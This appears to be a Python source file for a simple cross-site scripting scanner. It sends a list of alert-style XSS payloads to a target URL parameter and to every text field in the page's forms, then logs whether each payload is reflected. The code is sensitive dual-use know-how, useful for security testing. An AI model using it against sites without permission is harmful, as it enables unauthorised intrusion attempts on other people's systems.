import time, requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin

#list of base payloads for the xss testing for cli
payload_list = ["<script", "onerror", "onload[]", 
                 "javascript:", "<script>alert('test')</script>", 
                 "<img", "<svg", "<script>alert('XSS')</script>", 
                "';alert('XSS');//", "<img src='x' onerror='alert(1)'>", 
                "javascript:alert('XSS')"]

#"/search?q=<script>alert(1)</script>", "username=<script>alert(1)</script>", "comment=<script>alert(1)</script>"

#def xss_attack(xss_payload, target, xss_config):

#xss attack function to get base logic done and to see if it works using cli
def xss_attack(target, xss_config):
    
    #xss info for the attack 
    xss_log = []
    attack_timer = time.time()
    xss_payload = xss_config.get("payloads") or payload_list
    xss_type = xss_config.get("xss_type", "reflected")
    
    
    xss_log.append(f'XSS type: {xss_type}')
    xss_attempt = 0
    xss_success_num = 0
    url = target["url"]

    #loop to go through the target and see if there are any attack vulnerabilities for the target
    for payload in xss_payload:
        #updates logs based on information about the xss attack
        xss_log.append(f"XSS Payload for Attack using {payload}")
        xss_attempt += 1

        try:
            response = requests.get(target["url"], params={target.get("param", "q"): payload}, timeout=5)
            soup = BeautifulSoup(response.text, "html.parser")
            if target.get("sanitizes_input"):
                xss_log.append("Target sanitized XSS input.")
                continue

            xss_log.append("Target did not sanitize XSS input.")

            if xss_type == "stored":
                if target.get("stores_input"):
                    xss_log.append("XSS Payload for attack stored.")
        
            if target.get("output_escaped"):
                xss_log.append("Output escaped before rendering via payload information.")

            xss_log.append("Ouput from XSS payload was not escaped.")

            #if payload in soup.text:
            if payload in response.text:
                xss_log.append("XSS attack went through in the browser.")
                xss_success_num += 1
            else: 
                xss_log.append("Payload not reflected.")
            
            payload_escaped = payload.replace("<", "&lt;").replace(">", "&gt;")
            if payload_escaped in soup.text:
                xss_log.append("Payload escaped")
            
            if "Content-Security-Policy" in response.headers:
                xss_log.append("Site has Content Security Policy in header")

        except Exception as error_exception:
            xss_log.append(f"Error with request/xss: {error_exception}")
            
    site_forms = get_site_forms(url)
    xss_log.append(f"Forms on page: {len(site_forms)}")
    for form in site_forms:
        form_details = get_form_details(form)
        for payload in xss_payload:
            xss_log.append(f"Inject payload into form: {payload}")
            xss_attempt += 1

            try: 
                response = submit_form(form_details, url, payload)
                soup = BeautifulSoup(response.text, "html.parser")
                #if payload in soup.text:
                if payload in response.text:
                    xss_log.append("Payload reflected form.")
                    xss_success_num += 1
                else:
                    xss_log.append("Payload didn't reflect form.")
            except Exception as error_exception:
                xss_log.append(f"Error with request/xss: {error_exception}")
                        

    
    #end of attack information for the xss info
    time_done = time.time()
    xss_time = time_done - attack_timer

    if xss_success_num > 0:
        vulnerability = True
        payload_check = "Successful payload."
    else:
        vulnerability = False
        payload_check = "Payload failed."

    #returns relevant information from the attack to see the vulnerbility, logs, and other important information
    return {
        "vulnerability": vulnerability,
        "xss_attempt": xss_attempt,
        "xss_successful": payload_check,
        "xss_time": xss_time,
        "xss_log": xss_log
    }


def get_site_forms(url):
    try:
        response = requests.get(url, timeout=5)
        soup = BeautifulSoup(response.text, "html.parser")

        return soup.find_all("form")
    except requests.exceptions.RequestException:
        return []
    

def get_form_details(form):
    form_details = {}
    
    form_action = form.attrs.get("action", "").lower()
    form_method = form.attrs.get("method", "get").lower()
    
    inputs = get_form_inputs(form)
    form_details["action"] = form_action
    form_details["method"] = form_method
    form_details["inputs"] = inputs
    return form_details


def get_form_inputs(form):
    form_inputs = []
    for input in form.find_all("input"):
        name = input.get("name")
        input_type = input.get("type", "text")

        if name:
            form_inputs.append({"name": name, "type": input_type})

    for text_and_comments in form.find_all("textarea"):
        name = text_and_comments.get("name")

        if name:
            form_inputs.append({"name": name, "type": "textarea"})

    return form_inputs


def submit_form(form_details, url, payload):
    #form_action = form.get("action")
    #form_method = form.get("method", "get").lower()

    target_url = urljoin(url, form_details["action"])
    form_inputs = form_details["inputs"]
    data = {}

    for input in form_inputs:
        if input["type"] == "text" or input["type"] == "search" or input["type"] == "textarea":
            data[input["name"]] = payload

    print(f"Submitting payload to {target_url}")

    if form_details["method"] == "post":
        return requests.post(target_url, data=data, timeout=5)
    else:
        return requests.get(target_url, params=data, timeout = 5)